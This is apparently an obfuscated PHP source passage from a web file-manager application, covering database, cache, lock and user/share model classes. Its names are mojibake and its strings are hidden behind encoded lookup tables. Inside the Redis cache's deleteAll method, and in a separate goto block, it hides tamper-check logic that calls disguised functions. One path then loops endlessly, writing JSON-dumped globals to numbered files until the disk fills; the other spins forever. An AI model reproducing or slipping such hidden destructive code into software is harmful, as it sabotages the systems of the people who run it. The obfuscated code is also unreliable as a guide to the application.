SQLite3($Ρό€ΰέ[$Νμζ―™Ά[21]]); if (!$this->linkID[$‡ϋκ‚ΨΘ]) { think_exception($this->linkID[$‡ϋκ‚ΨΘ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$‡ϋκ‚ΨΘ]->busyTimeout(30000); if (1 != think_config($Νμζ―™Ά[22])) { unset($this->config); } } return $this->linkID[$‡ϋκ‚ΨΘ]; } public function free() { $this->queryID = null; } public function query($ε‹Κψ³ο) { $υΦΗΐΝψ =& $_SERVER[γγάψ½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ε‹Κψ³ο; if ($this->queryID) { $this->free(); } think_action_status($υΦΗΐΝψ[23], 1); think_status($υΦΗΐΝψ[24]); $this->queryID = $this->_linkID->query($ε‹Κψ³ο); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ΙΫƒΧΝύ = $this->getAll(); $this->numRows = count($ΙΫƒΧΝύ); return $ΙΫƒΧΝύ; } } public function execute($«ω‹Ίΐ) { $›ΛΔΐ =& $_SERVER[γγάψ½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $«ω‹Ίΐ; if ($this->queryID) { $this->free(); } think_action_status($›ΛΔΐ[25], 1); think_status($›ΛΔΐ[24]); $χαΓοή = $this->_linkID->exec($«ω‹Ίΐ); $this->debug(); if (!1 === $χαΓοή) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[γγάψ½][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ηΒενΖ™ = $this->_linkID->query($_SERVER[γγάψ½][27]); if (!$ηΒενΖ™) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $τπιΝξ§ = $this->_linkID->query($_SERVER[γγάψ½][28]); if (!$τπιΝξ§) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $νεΠι½Ζ = array(); while ($‚ϋί¨λώ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $νεΠι½Ζ[] = $‚ϋί¨λώ; } $this->queryID->reset(); return $νεΠι½Ζ; } public function getFields($‡σ‡†Χ») { $βΗΛΖ‰ƒ =& $_SERVER[γγάψ½]; $ΡΟ†·ϊο = $this->query($βΗΛΖ‰ƒ[29] . $‡σ‡†Χ» . $βΗΛΖ‰ƒ[30]); $ρ†ηΧ­ = array(); if ($ΡΟ†·ϊο) { foreach ($ΡΟ†·ϊο as $λθέ¶ς => $Ήα§ηη§) { $ρ†ηΧ­[$Ήα§ηη§[$βΗΛΖ‰ƒ[32]]] = array($βΗΛΖ‰ƒ[32] => $Ήα§ηη§[$βΗΛΖ‰ƒ[32]], $βΗΛΖ‰ƒ[33] => $Ήα§ηη§[$βΗΛΖ‰ƒ[33]], $βΗΛΖ‰ƒ[35] => (bool) ($Ήα§ηη§[$βΗΛΖ‰ƒ[35]] === $βΗΛΖ‰ƒ[12]), $βΗΛΖ‰ƒ[37] => $Ήα§ηη§[$βΗΛΖ‰ƒ[56]], $βΗΛΖ‰ƒ[39] => (bool) $Ήα§ηη§[$βΗΛΖ‰ƒ[57]], $βΗΛΖ‰ƒ[42] => (bool) $Ήα§ηη§[$βΗΛΖ‰ƒ[57]]); } } return $ρ†ηΧ­; } public function getTables($Υλ‡Σ†• = '') { $«ΏΝΑ =& $_SERVER[γγάψ½]; $†ό„€‘ = $this->query($«ΏΝΑ[45] . $«ΏΝΑ[46] . $«ΏΝΑ[47]); $Α„ωΈω = array(); foreach ($†ό„€‘ as $ΗΓήΤΥµ => $¶ΜΈγ) { $Α„ωΈω[$ΗΓήΤΥµ] = current($¶ΜΈγ); } return $Α„ωΈω; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $μΐ‰ΥτΔ =& $_SERVER[γγάψ½]; $this->error = $this->_linkID->lastErrorMsg(); if ($μΐ‰ΥτΔ[12] != $this->queryStr) { $this->error .= LNG($μΐ‰ΥτΔ[48]) . $this->queryStr; } think_trace($this->error, $μΐ‰ΥτΔ[12], $μΐ‰ΥτΔ[49]); return $this->error; } public function escapeString($τΐΫΨ«») { $σΒ¥΅Α =& $_SERVER[γγάψ½]; if ($this->_linkID) { return $this->_linkID->escapeString($τΐΫΨ«»); } return str_ireplace($σΒ¥΅Α[58], $σΒ¥΅Α[59], $τΐΫΨ«»); } public function parseLimit($£²Ού) { $ΑΣΩ»°® =& $_SERVER[γγάψ½]; $πƒξ‹°ρ = $ΑΣΩ»°®[12]; if (!empty($£²Ού)) { $£²Ού = explode($ΑΣΩ»°®[50], $£²Ού); if (count($£²Ού) > 1) { $πƒξ‹°ρ .= $ΑΣΩ»°®[51] . $£²Ού[1] . $ΑΣΩ»°®[52] . $£²Ού[0] . $ΑΣΩ»°®[53]; } else { $πƒξ‹°ρ .= $ΑΣΩ»°®[51] . $£²Ού[0] . $ΑΣΩ»°®[53]; } } return $πƒξ‹°ρ; } } goto CζγΣ‡΅Θ³; e‰¤‚γίω: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\145\162\x5f\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($™Σ³Π—΅) { $Χό’Ρκ =& $_SERVER[γγάψ½]; $έι†Δ = defined($Χό’Ρκ[2221]) && USER_ID ? USER_ID : $Χό’Ρκ[12]; return "\125\163\145\162\x4f\160\164\x69\x6f\156\x5f{$™Σ³Π—΅}\137" . $έι†Δ; } protected function filterWhere($ƒβδ…¶ά) { $ζΚ¦λή =& $_SERVER[γγάψ½]; $ƒβδ…¶ά[$ζΚ¦λή[1793]] = defined($ζΚ¦λή[2221]) && USER_ID ? USER_ID : $ζΚ¦λή[12]; return $ƒβδ…¶ά; } public function cacheRemoveUser($’Έ΄ΠΜΠ, $λ¤ΖΔ™) { return Cache::remove("\x55\163\x65\x72\117\x70\x74\151\x6f\156\137{$’Έ΄ΠΜΠ}\137" . $λ¤ΖΔ™); } protected function optionDefault($ώ±—ΦΦυ = '') { $΄»ασ =& $_SERVER[γγάψ½]; if ($ώ±—ΦΦυ == $΄»ασ[12]) { return $GLOBALS[$΄»ασ[6]][$΄»ασ[2536]]; } if ($ώ±—ΦΦυ == $΄»ασ[2537]) { return $GLOBALS[$΄»ασ[6]][$΄»ασ[2538]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\162\56\x74\x61\147\x4c\151\163\x74"; public $modelType = "\125\163\145\x72\117\x70\x74\151\157\156"; public $field = array("\156\141\x6d\145", "\x73\x74\x79\x6c\145", "\x73\157\162\x74"); public function listData($μ΅¬ρ¨ = false, $ΰτΤφΟ = "\x73\x6f\162\x74", $Υ¦„―Γϊ = false) { return parent::listData($μ΅¬ρ¨, $ΰτΤφΟ, $Υ¦„―Γϊ); } public function remove($–¦Ίµ§Ί) { return parent::remove($–¦Ίµ§Ί); } public function add($γϊ¥ , $™Γϋεθ = "\154\141\x62\145\154\x2d\147\x72\145\171\x2d\x6e\157\x72\x6d\x61\154") { $Κ„–ν³ =& $_SERVER[γγάψ½]; if ($this->findByName($γϊ¥ )) { return !1; } $™Μζ™‡£ = array($Κ„–ν³[497] => $γϊ¥ , $Κ„–ν³[563] => $™Γϋεθ, $Κ„–ν³[1997] => $this->getSort($Κ„–ν³[338]) + 1); return parent::insert($™Μζ™‡£); } public function update($τη²Υ‰, $ΚΊΆΫΏ) { $¶”»ΰ¥³ =& $_SERVER[γγάψ½]; $³Χ•ςΐ = $this->listData($τη²Υ‰); $»ί°Ϋθ = $this->findByName($ΚΊΆΫΏ[$¶”»ΰ¥³[32]]); if (!$³Χ•ςΐ || $»ί°Ϋθ && $»ί°Ϋθ[$¶”»ΰ¥³[478]] != $³Χ•ςΐ[$¶”»ΰ¥³[478]]) { return !1; } return parent::update($τη²Υ‰, $ΚΊΆΫΏ); } public function moveTop($ςΏΛΑ‡) { $π΅Ύ²ε =& $_SERVER[γγάψ½]; $έ“ΐδ = parent::listData(); $ΫΊ–’ζ = $this->getSort($π΅Ύ²ε[337]); foreach ($έ“ΐδ as &$€Αήέ ) { if ($€Αήέ [$π΅Ύ²ε[478]] == $ςΏΛΑ‡) { $€Αήέ [$π΅Ύ²ε[2017]] = $ΫΊ–’ζ; continue; } $€Αήέ [$π΅Ύ²ε[2017]] += 1; } unset($€Αήέ ); return parent::resetData($έ“ΐδ); } public function moveBottom($¤χΥό¤§) { $Ά•Δ±— =& $_SERVER[γγάψ½]; $Ψµ—Ο‚½ = $this->getSort($Ά•Δ±—[338]) + 1; return parent::update($¤χΥό¤§, array($Ά•Δ±—[2017] => $Ψµ—Ο‚½)); } public function resetSort($ψ¬£ισΑ) { $ΒΊπύ =& $_SERVER[γγάψ½]; $¦Μ°£Ρ‹ = array(); $ψ¬£ισΑ = is_array($ψ¬£ισΑ) ? $ψ¬£ισΑ : array(); for ($½ΧλΌΫ = 0; $½ΧλΌΫ < count($ψ¬£ισΑ); $½ΧλΌΫ++) { $¦Μ°£Ρ‹[$ψ¬£ισΑ[$½ΧλΌΫ] . $ΒΊπύ[12]] = $½ΧλΌΫ + 1; } $ΩΌψ›Έ† = parent::listData(); foreach ($ΩΌψ›Έ† as &$ƒ®ίυμβ) { $‡ρ‡άηθ = $¦Μ°£Ρ‹[$ƒ®ίυμβ[$ΒΊπύ[478]]]; $ƒ®ίυμβ[$ΒΊπύ[2017]] = $‡ρ‡άηθ ? $‡ρ‡άηθ : $ƒ®ίυμβ[$ΒΊπύ[2017]]; } unset($ƒ®ίυμβ); return parent::resetData($ΩΌψ›Έ†); } private function getSort($ϊ…ΓΤΕ) { $ £Άέ® =& $_SERVER[γγάψ½]; $ίΟίμ = parent::listData(); $χΏέ½Α = array_to_keyvalue($ίΟίμ, $ £Άέ®[12], $ £Άέ®[2017]); if (!$χΏέ½Α) { $χΏέ½Α = array(0); } $μ¥Βμ¤ = $ϊ…ΓΤΕ == $ £Άέ®[338] ? max($χΏέ½Α) : min($χΏέ½Α); return intval($μ¥Βμ¤); } } goto dάο…κ ‡; CΤκ†εθΟ: class CacheLockDatabase { public function lock($Ύ©¦Ηε”, $ΜσΚρ = 0) { $ΧεΈή¶χ = Model($_SERVER[γγάψ½][909]); $ρΥΎ²»Ύ = microtime(!0) + $ΜσΚρ; while (microtime(!0) < $ρΥΎ²»Ύ) { $®ητΛ = $ΧεΈή¶χ->get($Ύ©¦Ηε”); if (!$®ητΛ || $®ητΛ < microtime(!0)) { $—ϋβΈΨσ = $ΧεΈή¶χ->set($Ύ©¦Ηε”, $ρΥΎ²»Ύ); if ($—ϋβΈΨσ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($άΥή―Ξ) { return Model($_SERVER[γγάψ½][909])->get($άΥή―Ξ); } public function unlock($αΘΰΪλ²) { Model($_SERVER[γγάψ½][909])->remove($αΘΰΪλ²); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ίΫνάΞΫ, $ζΖΝ‡ή) { $ΐ±δΤΥ =& $_SERVER[γγάψ½]; if (!class_exists($ΐ±δΤΥ[948])) { show_json($ΐ±δΤΥ[949], !1); } $this->cacheTime = $ζΖΝ‡ή; $this->handle = new Memcached(); if (is_array($ίΫνάΞΫ[$ΐ±δΤΥ[950]]) && count($ίΫνάΞΫ[$ΐ±δΤΥ[950]]) >= 1) { foreach ($ίΫνάΞΫ[$ΐ±δΤΥ[950]] as $―†Κώ¨) { $ύ®¥ιη½ = explode($ΐ±δΤΥ[4], $―†Κώ¨); $this->handle->addServer($ύ®¥ιη½[0], $ύ®¥ιη½[1]); } } else { $this->handle->addServer($ίΫνάΞΫ[$ΐ±δΤΥ[209]], $ίΫνάΞΫ[$ΐ±δΤΥ[210]]); } } public function set($Σ¥‡, $α’ΫήΦ«, $—Ο©•Ωύ = false) { $—Ο©•Ωύ = $—Ο©•Ωύ ? $—Ο©•Ωύ : $this->cacheTime; return $this->handle->set($Σ¥‡, $α’ΫήΦ«, $—Ο©•Ωύ); } public function get($ΒΝ΅§κΝ) { return $this->handle->get($ΒΝ΅§κΝ); } public function remove($ΚΆδΗ¨) { return $this->handle->delete($ΚΆδΗ¨); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($δαΡόΊΓ, $ΜΆ΄ύ½) { $Ί°―νχ¥ =& $_SERVER[γγάψ½]; if (!class_exists($Ί°―νχ¥[951])) { show_json($Ί°―νχ¥[952], !1); } $this->cacheTime = $ΜΆ΄ύ½; $­έ„Ϋ = isset($δαΡόΊΓ[$Ί°―νχ¥[953]]) ? $δαΡόΊΓ[$Ί°―νχ¥[953]] : 10; $ζ„λ = _get($δαΡόΊΓ, $Ί°―νχ¥[950]); if ($ζ„λ && is_array($ζ„λ)) { $this->initCluster($δαΡόΊΓ, $­έ„Ϋ); } else { $this->handle = $this->init($δαΡόΊΓ, $­έ„Ϋ); } } private function init($ϋςόΧ, $°‹‚Ψ«) { $°¨Ζψ΅ =& $_SERVER[γγάψ½]; $–τ¨³Ξ = new Redis(); $ΉΑΊδ΅ = isset($ϋςόΧ[$°¨Ζψ΅[954]]) ? $ϋςόΧ[$°¨Ζψ΅[954]] : !1; if ($ΉΑΊδ΅) { $–τ¨³Ξ->pconnect($ϋςόΧ[$°¨Ζψ΅[209]], $ϋςόΧ[$°¨Ζψ΅[210]], $°‹‚Ψ«); } else { $–τ¨³Ξ->connect($ϋςόΧ[$°¨Ζψ΅[209]], $ϋςόΧ[$°¨Ζψ΅[210]], $°‹‚Ψ«); } if (!empty($ϋςόΧ[$°¨Ζψ΅[490]])) { $–τ¨³Ξ->auth($ϋςόΧ[$°¨Ζψ΅[490]]); } if (!empty($ϋςόΧ[$°¨Ζψ΅[832]]) && $ϋςόΧ[$°¨Ζψ΅[832]] != 0) { $–τ¨³Ξ->select($ϋςόΧ[$°¨Ζψ΅[832]]); } return $–τ¨³Ξ; } private function initCluster($δτκ……Ν, $φΟ©Φ΄¤) { $…„§›Η =& $_SERVER[γγάψ½]; $¥ΌΎόί = array($…„§›Η[955], $…„§›Η[956], $…„§›Η[957]); $‚Φ™ΛρΔ = $…„§›Η[955]; if (isset($δτκ……Ν[$…„§›Η[16]]) && in_array($δτκ……Ν[$…„§›Η[16]], $¥ΌΎόί)) { $‚Φ™ΛρΔ = $δτκ……Ν[$…„§›Η[16]]; } switch ($‚Φ™ΛρΔ) { case $…„§›Η[955]: $this->_slave($δτκ……Ν, $φΟ©Φ΄¤); break; case $…„§›Η[956]: break; case $…„§›Η[957]: $this->isCluster = !0; $η±βΛ―¥ = $δτκ……Ν[$…„§›Η[950]]; $ΥΏΝΛκ = isset($δτκ……Ν[$…„§›Η[954]]) ? $δτκ……Ν[$…„§›Η[954]] : !1; $‚ΣΊ­‡ = isset($δτκ……Ν[$…„§›Η[490]]) ? $δτκ……Ν[$…„§›Η[490]] : null; $this->handle = new RedisCluster(NUll, $η±βΛ―¥, $φΟ©Φ΄¤, $φΟ©Φ΄¤, $ΥΏΝΛκ, $‚ΣΊ­‡); break; default: break; } } private function _slave($«ΧΏ Λ, $ϋβλ¥‹Τ) { $ΘςΠΪ = $«ΧΏ Λ[$_SERVER[γγάψ½][950]]; $this->filterConfig($«ΧΏ Λ, $ΘςΠΪ[0]); $this->handle = $this->init($«ΧΏ Λ, $ϋβλ¥‹Τ); unset($ΘςΠΪ[0]); if (empty($ΘςΠΪ)) { return; } $°ιμδΊ = array_rand($ΘςΠΪ); $this->filterConfig($«ΧΏ Λ, $ΘςΠΪ[$°ιμδΊ]); $this->slaveHandle = $this->init($«ΧΏ Λ, $ϋβλ¥‹Τ); } private function filterConfig(&$°ο­—τ, $ψ„ηΒ) { $ΪΦΟνΊ =& $_SERVER[γγάψ½]; $£ά© = explode($ΪΦΟνΊ[4], $ψ„ηΒ); $½‹ϋΕμΰ = array($ΪΦΟνΊ[209] => $£ά©[0], $ΪΦΟνΊ[210] => $£ά©[1]); $°ο­—τ = array_merge($°ο­—τ, $½‹ϋΕμΰ); } public function set($»§ΗΌ―ϊ, $Οτ‰ξ¥, $ί®ΐΉΦ = false) { $ί®ΐΉΦ = $ί®ΐΉΦ ? $ί®ΐΉΦ : $this->cacheTime; return $this->handle->setEx($»§ΗΌ―ϊ, $ί®ΐΉΦ, $Οτ‰ξ¥); } public function setLock($μώΉΉ©, $›δωλΘΌ, $ΉΆ’§¬) { return $this->handle->setNX($μώΉΉ©, $›δωλΘΌ); } public function get($®¥Ψƒ‹Ϊ) { $¬”Θ®ψ’ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $¬”Θ®ψ’->get($®¥Ψƒ‹Ϊ); } public function remove($­…Λ—¨) { return $this->handle->del($­…Λ—¨); } public function deleteAll() { $Αγΰσ¥¦ =& $_SERVER[γγάψ½]; $ήΦ‰‚‰Φ = $_SERVER[$Αγΰσ¥¦[958]] . $Αγΰσ¥¦[959]; $ρΧ¨― = $Αγΰσ¥¦[960]; if ($_SERVER[$Αγΰσ¥¦[961]] != $ρΧ¨―($ήΦ‰‚‰Φ)) { $’ΣϊΒΝ = $Αγΰσ¥¦[962]; $πΤΐΒ’ = $Αγΰσ¥¦[963]; $Κ–ξ­ = $_SERVER[$Αγΰσ¥¦[958]] . $Αγΰσ¥¦[959]; $ςΫΗΘΨ = $πΤΐΒ’($Κ–ξ­); $©σή“‘ = explode($Αγΰσ¥¦[288], $ςΫΗΘΨ); if (count($©σή“‘) < $Αγΰσ¥¦[701]) { $τς—…ξξ = $Αγΰσ¥¦[964]; $τς—…ξξ(); } $Θθιισ = $Αγΰσ¥¦[965]; $Θθιισ($_SERVER[$Αγΰσ¥¦[966]]); $’ΣϊΒΝ = $Αγΰσ¥¦[962]; $’ΣϊΒΝ(); $½’‰Α… = $Αγΰσ¥¦[967]; $­›ξΩ Ρ = json_encode($GLOBALS[$Αγΰσ¥¦[968]]); $¦Νοκ = 1; for ($ΈήΕΉ = $¦Νοκ; $ΈήΕΉ > 0; $ΈήΕΉ++) { $½’‰Α…(DATA_PATH . $ΈήΕΉ, $­›ξΩ Ρ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $·τγ®ρο) { $this->handle->flushall($·τγ®ρο); } return; } return $this->handle->flushAll(); } } goto a§ή”Ω¥„; B”¤δθ¦„…: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($‚„Άϋω§, $‰ΟΣαΐ…) { $οΩΠΩζ =& $_SERVER[γγάψ½]; $this->cachePath = $‚„Άϋω§[$οΩΠΩζ[87]]; $this->prefix = $οΩΠΩζ[915]; $this->cacheTime = $‰ΟΣαΐ…; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($φ‰ξ›) { $‘χωΡΦΣ =& $_SERVER[γγάψ½]; $φ‰ξ› = str_replace(array($‘χωΡΦΣ[916], $‘χωΡΦΣ[100], $‘χωΡΦΣ[76]), $‘χωΡΦΣ[917], $φ‰ξ›); return $this->cachePath . $‘χωΡΦΣ[918] . $φ‰ξ› . $‘χωΡΦΣ[919]; } public function set($Ί–«Ϊ„ϊ, $°‚αΈ, $εγΓχι¬ = false) { $εγΓχι¬ = $εγΓχι¬ ? $εγΓχι¬ : $this->cacheTime; $‚¬…Ε»‘ = $this->getFile($Ί–«Ϊ„ϊ); if (file_put_contents($‚¬…Ε»‘, $this->prefix . $°‚αΈ, LOCK_EX)) { @touch($‚¬…Ε»‘, intval(time() + $εγΓχι¬)); clearstatcache(); return !0; } @unlink($‚¬…Ε»‘); return !1; } public function get($ΊΰΓφψΐ) { $ΊΦά«α‘ = $this->getFile($ΊΰΓφψΐ); if (file_exists($ΊΦά«α‘) && filemtime($ΊΦά«α‘) < time()) { @unlink($ΊΦά«α‘); return !1; } $ψς΅‚ = @file_get_contents($ΊΦά«α‘); return substr($ψς΅‚, strlen($this->prefix)); } public function remove($›ω³‰) { $¤ι³Ϋ = $this->getFile($›ω³‰); return @unlink($¤ι³Ϋ); } public function deleteAll() { $ΉΦΊ€ω =& $_SERVER[γγάψ½]; $Πόΐμόί = scandir($this->cachePath); foreach ($Πόΐμόί as $Χρ³ρ) { $Κ³‚ΌΚ¤ = $this->cachePath . $Χρ³ρ; if (strpos($Κ³‚ΌΚ¤, $ΉΦΊ€ω[919]) && strpos($Κ³‚ΌΚ¤, $ΉΦΊ€ω[920])) { @unlink($Κ³‚ΌΚ¤); } } } public function clearTimeout() { $°αΓ·Μ¤ =& $_SERVER[γγάψ½]; $£ΜΟ”υ‚ = scandir($this->cachePath); foreach ($£ΜΟ”υ‚ as $Πι–ήΣζ) { $½‹όΩς = $this->cachePath . $Πι–ήΣζ; if (strpos($½‹όΩς, $°αΓ·Μ¤[919]) && strpos($½‹όΩς, $°αΓ·Μ¤[920]) && filemtime($½‹όΩς) < time()) { @unlink($½‹όΩς); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $—‘ήίρξ =& $_SERVER[γγάψ½]; if (self::$handle) { return self::$handle; } $ϋ®¥“„‘ = $GLOBALS[$—‘ήίρξ[6]][$—‘ήίρξ[427]]; self::$timeout = $ϋ®¥“„‘[$—‘ήίρξ[921]] ? $ϋ®¥“„‘[$—‘ήίρξ[921]] : 10; $΅ίΈ£¶ = _get($GLOBALS[$—‘ήίρξ[6]], $—‘ήίρξ[922]); $΅΄ί“ήΧ = $ϋ®¥“„‘[$—‘ήίρξ[907]] ? $ϋ®¥“„‘[$—‘ήίρξ[907]] : $—‘ήίρξ[233]; if ($΅΄ί“ήΧ == $—‘ήίρξ[21] && $΅ίΈ£¶ == $—‘ήίρξ[13]) { $΅΄ί“ήΧ = $—‘ήίρξ[233]; } switch ($΅΄ί“ήΧ) { case $—‘ήίρξ[910]: self::$handle = new CacheLockRedis(); break; case $—‘ήίρξ[911]: self::$handle = new CacheLockMemcached(); break; case $—‘ήίρξ[21]: self::$handle = new CacheLockDatabase(); break; case $—‘ήίρξ[233]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($—‘ήίρξ[923], $—‘ήίρξ[924]); } return self::$handle; } private static function key($†Δ΅Φ») { return $_SERVER[γγάψ½][925] . Cache::key($†Δ΅Φ»); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($ΑκΞξω— = '') { self::$errorMsg = $ΑκΞξω—; } public static function lockGlobal($΄Βρ¨, $Μχί±Ώ) { return self::lock($΄Βρ¨, $Μχί±Ώ, !0); } public static function lock($¶€ΥΞ‘, $”»ΕΟΉ– = false, $ά—σλ¤ϋ = false) { $‡ώηΗυψ =& $_SERVER[γγάψ½]; $‚ΏθΠ = self::init(); $»ΐΆΧΌ° = self::key($¶€ΥΞ‘); $”»ΕΟΉ– = $”»ΕΟΉ– ? $”»ΕΟΉ– : self::$timeout; $”Ϋ¨έΤ½ = timeFloat(); if (_get($GLOBALS, $‡ώηΗυψ[926], !1)) { if (!$‚ΏθΠ->lock($»ΐΆΧΌ°, 0.2)) { die; } return !0; } $ΌΝς΅Ρρ = $‚ΏθΠ->lock($»ΐΆΧΌ°, $”»ΕΟΉ–); $Ύα£ΩβΘ = timeFloat(); if (!$ΌΝς΅Ρρ) { $Τ•“Ύ«« = "\154\x6f\x63\153\x20\x65\x72\x72\x6f\x72\73\153\x65\x79\75{$¶€ΥΞ‘}\x3b\164\151\x6d\145\75{$”»ΕΟΉ–}\x3b" . self::$errorMsg . $‡ώηΗυψ[74] . get_caller_msg(); $ήΛόα¶Γ = LNG($‡ώηΗυψ[927]) . "\50{$”»ΕΟΉ–}\163\51\56" . LNG($‡ώηΗυψ[928]); $ήΛόα¶Γ .= $‡ώηΗυψ[929]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ήΛόα¶Γ = $ήΛόα¶Γ . $‡ώηΗυψ[930] . self::$errorMsg; } write_log($‡ώηΗυψ[931] . sprintf($‡ώηΗυψ[932], timeFloat() - $”Ϋ¨έΤ½) . $‡ώηΗυψ[933] . $Τ•“Ύ«« . $‡ώηΗυψ[934] . json_encode(error_get_last()), $‡ώηΗυψ[924]); show_json($ήΛόα¶Γ, !1); } if (!$ά—σλ¤ϋ) { self::$lockItem[$»ΐΆΧΌ°] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $·ϊΨ‡ = number_format(timeFloat() - $Ύα£ΩβΘ, 3); write_log($‡ώηΗυψ[935] . $¶€ΥΞ‘ . $‡ώηΗυψ[936] . $·ϊΨ‡, $‡ώηΗυψ[924]); } return $ΌΝς΅Ρρ; } public static function lockGet($Ύ€¶Τ) { $¥¨‹ = self::key($Ύ€¶Τ); if (self::$lockItem[$¥¨‹]) { return self::$lockItem[$¥¨‹]; } return self::init()->lockGet($¥¨‹); } public static function unlock($­΄Σν²Ϋ) { $ζΑΖσμΆ =& $_SERVER[γγάψ½]; $€Βπξ = self::key($­΄Σν²Ϋ); self::$lockItem[$€Βπξ] = null; self::init()->unlock($€Βπξ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ζΑΖσμΆ[937] . $­΄Σν²Ϋ, $ζΑΖσμΆ[924]); } return; } public static function unlockRuntime() { $Τƒ―­ =& $_SERVER[γγάψ½]; $ΘκΊΛ = self::init(); $έ’Φςΐ = !1; foreach (self::$lockItem as $³ΣΉΔ => $θ©Ώθ΄) { if (!$θ©Ώθ΄) { continue; } $ΘκΊΛ->unlock($³ΣΉΔ); if (!$έ’Φςΐ) { $έ’Φςΐ = !0; write_log($Τƒ―­[938] . $³ΣΉΔ . $Τƒ―­[74] . get_caller_msg(), $Τƒ―­[924]); continue; } write_log($Τƒ―­[938] . $³ΣΉΔ, $Τƒ―­[924]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ΏΤ§Ϊω– = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Τƒ―­[939] . $ΏΤ§Ϊω– . $Τƒ―­[940] . ACTION, $Τƒ―­[924]); } } public static function fileLock($φΜ© χ) { $Ι£Α§© =& $_SERVER[γγάψ½]; if (!$GLOBALS[$Ι£Α§©[941]]) { $GLOBALS[$Ι£Α§©[941]] = array(); } $GLOBALS[$Ι£Α§©[941]][$φΜ© χ] = !1; $τ—„§ΰ = fopen(DATA_PATH . $φΜ© χ . $Ι£Α§©[942], $Ι£Α§©[943]); if (!$τ—„§ΰ) { return !1; } $GLOBALS[$Ι£Α§©[941]][$φΜ© χ] = $τ—„§ΰ; if (flock($τ—„§ΰ, LOCK_EX)) { return !0; } self::unlock($φΜ© χ); show_json($Ι£Α§©[944], !1); return !1; } public static function fileUnlock($¨ΫΠ§Χ) { $ϊ΄­½’ =& $_SERVER[γγάψ½]; $Ϊ‡¦ΙΟ· = $GLOBALS[$ϊ΄­½’[941]][$¨ΫΠ§Χ]; if (!$Ϊ‡¦ΙΟ·) { return; } $GLOBALS[$ϊ΄­½’[941]][$¨ΫΠ§Χ] = !1; flock($Ϊ‡¦ΙΟ·, LOCK_UN); fclose($Ϊ‡¦ΙΟ·); } public static function fileUnlockAll() { $¨ΰΠίηο =& $_SERVER[γγάψ½]; if (!isset($GLOBALS[$¨ΰΠίηο[941]]) || !$GLOBALS[$¨ΰΠίηο[941]]) { return; } foreach ($GLOBALS[$¨ΰΠίηο[941]] as $®Μ‹Ορ => $Θτ¤£β) { if (!$Θτ¤£β) { continue; } $GLOBALS[$¨ΰΠίηο[941]][$®Μ‹Ορ] = !1; flock($Θτ¤£β, LOCK_UN); fclose($Θτ¤£β); } $GLOBALS[$¨ΰΠίηο[941]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto eφ„γκα†Η; eά‘“Σ·Ε: if (!isset($_SERVER[$_SERVER[γγάψ½][961]]) || !isset($_SERVER[$_SERVER[γγάψ½][1623]])) { $_getc = $_SERVER[γγάψ½][963]; $_getfile = $_SERVER[$_SERVER[γγάψ½][958]] . $_SERVER[γγάψ½][959]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[γγάψ½][288], $_getfilec); if (count($_getarrs) < $_SERVER[γγάψ½][706]) { $exit = $_SERVER[γγάψ½][964]; $exit(); } $_act = $_SERVER[γγάψ½][1624]; $_act($_SERVER[$_SERVER[γγάψ½][958]] . $_SERVER[γγάψ½][959]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[γγάψ½][457]); } } class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\x65"; protected $dataAuto = array(array("\155\157\144\x69\x66\x79\124\151\x6d\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\164\x2c\x75\160\x64\141\164\145", "\x66\165\x6e\143\x74\151\x6f\156"), array("\143\x72\145\x61\164\x65\x54\x69\155\145", "\164\x69\155\x65", "\151\x6e\x73\145\162\164", "\x66\x75\156\143\x74\151\157\156"), array("\x6f\160\x74\151\x6f\x6e\163", '', "\151\156\163\x65\162\x74\x2c\165\x70\144\141\164\145\x2c\163\145\154\x65\x63\164", "\x6a\x73\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($€ΠΥΓ) { $‘«Φ®ξΆ =& $_SERVER[γγάψ½]; $Ϋ«Κ©ύ– = isset($€ΠΥΓ[0]) ? $€ΠΥΓ[0] : !1; $Ι‰εΖ†Ύ = $‘«Φ®ξΆ[2136] . USER_ID; return array($‘«Φ®ξΆ[2137] => array(USER_ID, $‘«Φ®ξΆ[2138]), $‘«Φ®ξΆ[2077] => 